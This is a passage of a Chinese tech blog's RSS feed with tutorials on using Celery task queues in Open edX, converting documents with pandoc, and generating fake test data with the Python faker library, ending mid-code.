&lt;li&gt;&lt;a href="http://blog.csdn.net/MoreWindows/article/category/859207"&gt;白话经典算法系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/20368410"&gt;有哪些学习算法的网站推荐?(知乎)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Python&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/donnemartin/interactive-coding-challenges"&gt;interactive-coding-challenges&lt;/a&gt;:Python数据结构和算法挑战（Ipython Notebook）&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/prakhar1989/Algorithms"&gt;Algorithms&lt;/a&gt;:Python中的数据结构和算法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;leetcode&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/haoel/leetcode"&gt;haoel/leetcode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/soulmachine/leetcode"&gt;soulmachine/leetcode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gitbook.com/book/siddontang/leetcode-solution/details"&gt;LeetCode题解&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 25 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-25:algorithm-foreword.html</guid><category>algorithm</category></item><item><title>Celery在Open edX中的使用</title><link>/Celery-on-Open-edx.html</link><description>&lt;p&gt;折腾Open edX趣味之一是它很杂。&lt;/p&gt;
&lt;p&gt;大量的工具和架构设计在这里都有具体的场景，于是从使用中学习，先跑起来，然后修修改改，如果系统没有坏掉，就继续探索。&lt;/p&gt;
&lt;p&gt;我很喜欢这种增量式学习，在这里以实战的方式学习linux command 、数据库、Python 、require.js、任务队列、缓存、REST、OAuth...&lt;/p&gt;
&lt;p&gt;今天是Celery&lt;/p&gt;
&lt;h1&gt;Celery入门&lt;/h1&gt;
&lt;h2&gt;What&lt;/h2&gt;
&lt;p&gt;我喜欢将Celery视为执行&lt;code&gt;异步任务&lt;/code&gt;的工具，这个观念让我容易把握它。&lt;/p&gt;
&lt;p&gt;Celery是一个专注于实时处理的任务队列，同时也支持任务调度。&lt;/p&gt;
&lt;p&gt;Celery 是用 Python 编写的，但协议可以用任何语言实现&lt;/p&gt;
&lt;h3&gt;典型使用场景&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;我们可能需要执行一段费时的任务, 这一时间远超用户能忍受的范围. 当这一任务不需要立即执行时, 我们就可以使用Celery在后台执行, 而不影响当前用户浏览网页&lt;/li&gt;
&lt;li&gt;定期执行某些任务，类似linux中定时任务：crontab. 比如每天半夜2点执行一下数据分析, 然后将数据储存到数据库中. 我们可以编写这一任务, 然后让Celery来定时完成执行任务.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上述的任务即是&lt;code&gt;task&lt;/code&gt;,对应为一段python代码&lt;/p&gt;
&lt;h2&gt;基础概念&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;任务队列：是一种在线程或机器间分发任务的机制。&lt;/li&gt;
&lt;li&gt;Broker：中文意思是 &lt;code&gt;经纪人&lt;/code&gt; ，其实就是&lt;code&gt;消息队列&lt;/code&gt; ，用来发送和接受消息。这个Broker有几个方案可供选择：RabbitMQ，Redis（丢数据），数据库（不推荐）&lt;/li&gt;
&lt;li&gt;Backend:在Celery的配置中的一个配置项 CELERY_RESULT_BACKEND ，作用是保存结果和状态，如果你需要跟踪任务的状态，那么需要设置这一项&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Broker和Backend可以都使用redis&lt;/p&gt;
&lt;h2&gt;一个案例&lt;/h2&gt;
&lt;h3&gt;安装依赖&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;pip install celery&lt;/li&gt;
&lt;li&gt;sudo apt-get install rabbitmq-server（启动:rabbitmq-server）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;创建tasks.py&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;celery&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Celery&lt;/span&gt;

&lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Celery&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tasks&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;broker&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;amqp://celery:celery@localhost//&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#edx环境中rabbitmq已经默认安装，用户名和密码均为celery:celery&lt;/span&gt;

&lt;span class="nd"&gt;@app.task&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;before running x+y&amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;启动一个worker&lt;/h3&gt;
&lt;p&gt;在tasks.py同级目录下执行：&lt;code&gt;celery -A tasks worker --loglevel=info&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在生产环境中一般使用supervisor把它丢到后台运行&lt;/p&gt;
&lt;h3&gt;调度任务&lt;/h3&gt;
&lt;p&gt;使用ipython进入交互模式&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; from tasks import add
&amp;gt;&amp;gt;&amp;gt; add.delay(1, 2)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们可以在worker进程中看到&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[2015-11-23 16:13:26,341: INFO/MainProcess] Connected to amqp://celery:**@127.0.0.1:5672//
[2015-11-23 16:13:26,355: INFO/MainProcess] mingle: searching for neighbors
[2015-11-23 16:13:27,379: INFO/MainProcess] mingle: sync with 7 nodes
[2015-11-23 16:13:27,379: INFO/MainProcess] mingle: sync complete
[2015-11-23 16:13:27,387: WARNING/MainProcess] celery@vultr.guest ready.
[2015-11-23 16:13:30,303: INFO/MainProcess] Received task: tasks.add[af9f8162-5af0-4cd3-846b-4b6d4da3a4fc]
[2015-11-23 16:13:30,303: WARNING/Worker-1] before running x+y
[2015-11-23 16:13:30,304: INFO/MainProcess] Task tasks.add[af9f8162-5af0-4cd3-846b-4b6d4da3a4fc] succeeded in 0.000959093216807s: 3
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;上边的例子有返回值（执行结果），我们为了知道任务的执行结果和状态。需要设置backend。于是变为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;celery&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Celery&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;sleep&lt;/span&gt;
&lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Celery&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tasks&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;broker&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;amqp://celery:celery@localhost//&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;conf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="n"&gt;CELERY_RESULT_BACKEND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cache+memcached://127.0.0.1:11211/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nd"&gt;@app.task&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;before running x+y&amp;quot;&lt;/span&gt;
        &lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;进入ipython&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;from tasks import add
r=add.delay(1, 2)
r.ready() #False
r.result #为空,等十秒
r.ready() #True
r.result #3
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;分布式&lt;/h2&gt;
&lt;p&gt;Celery 系统可包含多个职程和中间人，以此获得高可用性和横向扩展能力。&lt;/p&gt;
&lt;p&gt;具体可参考:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.the5fire.com/take-a-glance-at-celery.html"&gt;Celery的安装和使用&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.celeryproject.org/en/latest/userguide/workers.html"&gt;Workers Guide&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Celery在Open edX中的使用&lt;/h1&gt;
&lt;p&gt;在Open edX中，使用RabbitMQ作为Broker，默认的用户名和密码都为celery，&lt;/p&gt;
&lt;p&gt;用CACHES作为Celery的backend（"django.core.cache.backends.memcached.MemcachedCache"）&lt;/p&gt;
&lt;p&gt;具体的使用场景主要是各类耗时的任务,典型的有成绩单生成，发送大量提醒邮件，任务的源码分布在各个django app的tasks.py文件里，诸如&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/master/lms/djangoapps/instructor_task/tasks.py"&gt;lms/djangoapps/instructor_task/tasks.py&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/master/cms/djangoapps/contentstore/tasks.py"&gt;cms/djangoapps/contentstore/tasks.py&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/master/lms/djangoapps/ccx/tasks.py"&gt;lms/djangoapps/ccx/tasks.py&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/master/lms/djangoapps/lti_provider/tasks.py"&gt;lms/lti_provider/tasks.py&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/tree/master/lms/djangoapps/instructor_task"&gt;lms/djangoapps/instructor_task&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/master/openedx/core/djangoapps/credit/tasks.py"&gt;openedx/core/djangoapps/credit/tasks.py&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/master/common/djangoapps/third_party_auth/tasks.py"&gt;common/djangoapps/third_party_auth/tasks.py&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;celery的启用代码&lt;/h3&gt;
&lt;p&gt;参考&lt;code&gt;/edx/app/supervisor/conf.d/workers.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;形如：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;command=/edx/app/edxapp/venvs/edxapp/bin/python /edx/app/edxapp/edx-platform/manage.py cms --settings=aws celery worker --loglevel=info --queues=edx.cms.core.low --hostname=edx.cms.core.low.%%h --concurrency=1
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/celery/celery"&gt;celery/celery&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.celeryproject.org/en/latest/django/first-steps-with-django.html"&gt;Using Celery with Django&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.celeryproject.org/en/latest/index.html"&gt;Celery - Distributed Task Queue&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.jinkan.org/docs/celery/"&gt;Celery - 分布式任务队列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.jinkan.org/docs/flask/patterns/celery.html"&gt;基于 Celery 的后台任务&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.the5fire.com/take-a-glance-at-celery.html"&gt;Celery的安装和使用&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.liaoxuefeng.com/article/00137760323922531a8582c08814fb09e9930cede45e3cc000"&gt;任务调度利器：Celery&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;补遗&lt;/h1&gt;
&lt;h3&gt;相关工具与主题&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://docs.celeryproject.org/en/latest/userguide/monitoring.html"&gt;监控&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.celeryproject.org/en/latest/faq.html#how-do-i-get-the-result-of-a-task-if-i-have-the-id-that-points-there"&gt;get task result&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/76b8e2e89761c30ac7aa2fa5e8aca4dc35d9002b/lms/djangoapps/instructor_task/api_helper.py#L102"&gt;_update_instructor_task AsyncResult&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 23 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-23:Celery-on-Open-edx.html</guid><category>edx</category></item><item><title>文档格式转化神器pandoc</title><link>/document-factory-pandoc.html</link><description>&lt;p&gt;作为一个工具控，喜欢被别人安利有趣的东西，我就很喜欢@XD小伙伴时不时的分享，遇到喜欢的东西也不能藏过夜，想快快安利给大家&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/jgm/pandoc"&gt;pandoc&lt;/a&gt;的惊艳是那种 风陵渡口，人间初见误终身。&lt;/p&gt;
&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;最近要给公司提供一堆文档，作为过去技术开发的总结，其实大多都已经整理在我的个人博客中了。可毕竟我不能ctrl-s下来吧，文档要的是干净利落整洁清晰，html参杂了博客的样式，显然不合适，同时公司喜欢归档pdf或是word格式的文件&lt;/p&gt;
&lt;p&gt;而我又习惯使用markdown写文档，我想大多程序员也是如此吧，在word里写会做噩梦的&lt;/p&gt;
&lt;p&gt;于是我找到&lt;code&gt;Mou&lt;/code&gt;(一款优秀的markdown写作工具)的导出功能，导出为PDF，可效果丑的不要不要的&lt;/p&gt;
&lt;p&gt;祭出神器Github，分分钟，找到pandoc&lt;/p&gt;
&lt;p&gt;一看源码吓的我都坐到地上了，90.5%的代码是Haskell写的，Haskell写的！写的！的！&lt;/p&gt;
&lt;p&gt;Pandoc作者是John MacFarlane，一位来自美国加州大学伯克利分校的哲学教授&lt;/p&gt;
&lt;p&gt;抛开Haskell的贵族血统不说，稳定和易用程度也是惊人&lt;/p&gt;
&lt;h1&gt;特性&lt;/h1&gt;
&lt;p&gt;pandoc能轻易把文件从一种标记语言格式转换到另一种格式，瑞士军刀一般全面而锋利。&lt;/p&gt;
&lt;p&gt;允许的input file：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Markdown&lt;/li&gt;
&lt;li&gt;reStructuredText  &lt;/li&gt;
&lt;li&gt;GitHub-Flavored Markdown&lt;/li&gt;
&lt;li&gt;Word docx&lt;/li&gt;
&lt;li&gt;ODT&lt;/li&gt;
&lt;li&gt;HTML &lt;/li&gt;
&lt;li&gt;LaTeX&lt;/li&gt;
&lt;li&gt;EPUB(v2 or v3)&lt;/li&gt;
&lt;li&gt;CommonMark&lt;/li&gt;
&lt;li&gt;PHP Markdown Extra&lt;/li&gt;
&lt;li&gt;Textile&lt;/li&gt;
&lt;li&gt;MediaWiki markup&lt;/li&gt;
&lt;li&gt;TWiki markup &lt;/li&gt;
&lt;li&gt;Haddock markup&lt;/li&gt;
&lt;li&gt;OPML &lt;/li&gt;
&lt;li&gt;Emacs Org mode &lt;/li&gt;
&lt;li&gt;DocBook&lt;/li&gt;
&lt;li&gt;txt2tags &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可选的output file&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PDF&lt;/li&gt;
&lt;li&gt;plain text,&lt;/li&gt;
&lt;li&gt;Markdown &lt;/li&gt;
&lt;li&gt;HTML5&lt;/li&gt;
&lt;li&gt;LaTeX&lt;/li&gt;
&lt;li&gt;Word docx&lt;/li&gt;
&lt;li&gt;OpenDocument&lt;/li&gt;
&lt;li&gt;ODT&lt;/li&gt;
&lt;li&gt;reveal.js或是S5 HTML 幻灯片&lt;/li&gt;
&lt;li&gt;CommonMark&lt;/li&gt;
&lt;li&gt;PHP Markdown Extra&lt;/li&gt;
&lt;li&gt;GitHub-Flavored Markdown&lt;/li&gt;
&lt;li&gt;reStructuredText&lt;/li&gt;
&lt;li&gt;XHTML&lt;/li&gt;
&lt;li&gt;ConTeXt&lt;/li&gt;
&lt;li&gt;RTF&lt;/li&gt;
&lt;li&gt;OPML&lt;/li&gt;
&lt;li&gt;DocBook&lt;/li&gt;
&lt;li&gt;OpenDocument&lt;/li&gt;
&lt;li&gt;ODT&lt;/li&gt;
&lt;li&gt;GNU Texinfo&lt;/li&gt;
&lt;li&gt;MediaWiki markup&lt;/li&gt;
&lt;li&gt;DokuWiki markup&lt;/li&gt;
&lt;li&gt;Haddock markup&lt;/li&gt;
&lt;li&gt;EPUB(v2 or v3)&lt;/li&gt;
&lt;li&gt;FictionBook2&lt;/li&gt;
&lt;li&gt;Textile&lt;/li&gt;
&lt;li&gt;groff man&lt;/li&gt;
&lt;li&gt;Emacs Org mode&lt;/li&gt;
&lt;li&gt;AsciiDoc&lt;/li&gt;
&lt;li&gt;InDesign ICML&lt;/li&gt;
&lt;li&gt;Slidy&lt;/li&gt;
&lt;li&gt;Slideous&lt;/li&gt;
&lt;li&gt;DZSlides] &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="http://yanping.me/cn/blog/2012/03/13/pandoc/"&gt;这篇文章&lt;/a&gt;做了更好的分类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTML格式: XHTML, HTML5, 以及HTML幻灯片Slidy， S5，或者DZSlides.&lt;/li&gt;
&lt;li&gt;文字处理软件格式： Microsoft Word docx, OpenOffice/LibreOffice ODT, OpenDocument XML&lt;/li&gt;
&lt;li&gt;电子书： EPUB&lt;/li&gt;
&lt;li&gt;文档格式： DocBook, GNU TexInfo, Groff man pages&lt;/li&gt;
&lt;li&gt;TeX格式： LaTeX, ConTeXt, LaTeX Beamer slides&lt;/li&gt;
&lt;li&gt;PDF via LaTeX&lt;/li&gt;
&lt;li&gt;轻量级标记语言格式： Markdown, reStructuredText, AsciiDoc, MediaWiki markup, Emacs Org-Mode, Textile&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;安装（Mac下）&lt;/h1&gt;
&lt;p&gt;brew install pandoc&lt;/p&gt;
&lt;h1&gt;使用&lt;/h1&gt;
&lt;p&gt;pandoc Open edX体系架构.md -o test.docx -c Github.css&lt;/p&gt;
&lt;p&gt;你看pandoc很聪明的，它会根据后缀自动判断格式&lt;/p&gt;
&lt;p&gt;于是我们看到格式从markdown：&lt;/p&gt;
&lt;p&gt;&lt;img alt="pandoc1" src="img/tools/pandoc1.png" /&gt;&lt;/p&gt;
&lt;p&gt;转化到docx，以Github的样式风格&lt;/p&gt;
&lt;p&gt;&lt;img alt="pandoc2" src="img/tools/pandoc2.png" /&gt;&lt;/p&gt;
&lt;h1&gt;Todo&lt;/h1&gt;
&lt;h2&gt;md2docx.py&lt;/h2&gt;
&lt;p&gt;写个脚本把当前目录下所有md文件装化为同名docx&lt;/p&gt;
&lt;h2&gt;md2webppt&lt;/h2&gt;
&lt;p&gt;也不想写ppt，折腾半天的字号好烦&lt;/p&gt;
&lt;p&gt;vim slides.md&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;% md2webppt&lt;/span&gt;
&lt;span class="c"&gt;% wwj&lt;/span&gt;
&lt;span class="c"&gt;% 2015/11/24&lt;/span&gt;

# 第一页

&lt;span class="o"&gt;-&lt;/span&gt; 第一项
&lt;span class="o"&gt;-&lt;/span&gt; 第二项

# 第一页

&lt;span class="o"&gt;-&lt;/span&gt; 第三项
&lt;span class="o"&gt;-&lt;/span&gt; 第四项

# 第一页

&lt;span class="o"&gt;-&lt;/span&gt; 第五项
&lt;span class="o"&gt;-&lt;/span&gt; 第六项
&lt;span class="o"&gt;-&lt;/span&gt; !&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;1.&lt;/span&gt;&lt;span class="n"&gt;png&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;pandoc slides.md -o slides.html -t dzslides -s&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们也可以使用流行的&lt;a href="https://github.com/hakimel/reveal.js"&gt;reveal.js&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;pandoc slides.md -o slides.html -t revealjs -s&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们还有一些主题可选：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;pandoc slides.md -o slides.html -t revealjs -s -V theme=solarized&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;default：（默认）深灰色背景，白色文字&lt;/li&gt;
&lt;li&gt;beige：米色背景，深色文字&lt;/li&gt;
&lt;li&gt;sky：天蓝色背景，白色细文字&lt;/li&gt;
&lt;li&gt;night：黑色背景，白色粗文字&lt;/li&gt;
&lt;li&gt;serif：浅色背景，灰色衬线文字&lt;/li&gt;
&lt;li&gt;simple：白色背景，黑色文字&lt;/li&gt;
&lt;li&gt;solarized：奶油色背景，深青色文字&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;更完备的案例参考&lt;a href="https://github.com/wwj718/reveal.js-with-pandoc"&gt;reveal.js-with-pandoc&lt;/a&gt;.这也是我自己在用的模板&lt;/p&gt;
&lt;p&gt;用markdown写PPT真是爽嗨&lt;/p&gt;
&lt;h1&gt;more&lt;/h1&gt;
&lt;p&gt;更多强大的特性，参考&lt;a href="https://github.com/jgm/pandoc"&gt;jgm/pandoc&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;附&lt;/h1&gt;
&lt;p&gt;如果你想convert pdf，请使用&lt;a href="https://github.com/coolwanglu/pdf2htmlEX"&gt;pdf2htmlEX&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;pdf2htmlEX --fit-width 1024 integral.pdf&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jgm/pandoc-templates"&gt;pandoc-templates&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/reveal.js-with-pandoc"&gt;reveal.js-with-pandoc&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/6e2ec0b8fff1"&gt;利用pandoc把markdown转换为doc和ppt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 23 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-23:document-factory-pandoc.html</guid><category>dev-tools</category></item><item><title>伪数据工厂faker</title><link>/fake-data-factory.html</link><description>&lt;p&gt;睁眼说瞎话并不为程序员所擅长，大多码农都避之不及，可在编程过程中，出于测试或是临时提供接口的目的，我们总得制造伪数据。如果需要伪造人名，三个以内还好，张三李四王五，可超过10个的话，我不知道你是不是就要侵犯你好朋友的姓名权了&lt;/p&gt;
&lt;p&gt;而如果是&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;Student&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;phone_number&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你要怎么办呢？&lt;/p&gt;
&lt;h1&gt;faker闪亮登场&lt;/h1&gt;
&lt;h2&gt;Install faker&lt;/h2&gt;
&lt;p&gt;pip install fake-factory&lt;/p&gt;
&lt;h2&gt;Usage&lt;/h2&gt;
&lt;p&gt;拿上边的问题来说，我们需要产生一组&lt;code&gt;(name,address,phone_number)&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;faker&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Factory&lt;/span&gt;
&lt;span class="n"&gt;fake&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Factory&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;zh_CN&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; 
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;phone_number&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fake&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="n"&gt;fake&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span 